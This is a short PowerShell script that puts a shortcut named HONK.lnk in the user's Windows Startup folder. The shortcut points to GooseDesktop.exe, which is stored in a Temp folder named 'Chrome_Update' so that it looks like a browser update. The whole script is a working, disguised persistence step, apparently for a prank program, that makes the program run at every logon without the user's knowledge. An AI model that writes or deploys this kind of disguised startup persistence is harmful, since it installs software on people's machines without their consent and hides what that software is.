$WScriptShell = New-Object -ComObject WScript.Shell
$TargetFile = "$env:Temp\Chrome_Update\Update\GooseDesktop.exe"
$ShortcutFile = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\HONK.lnk"
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()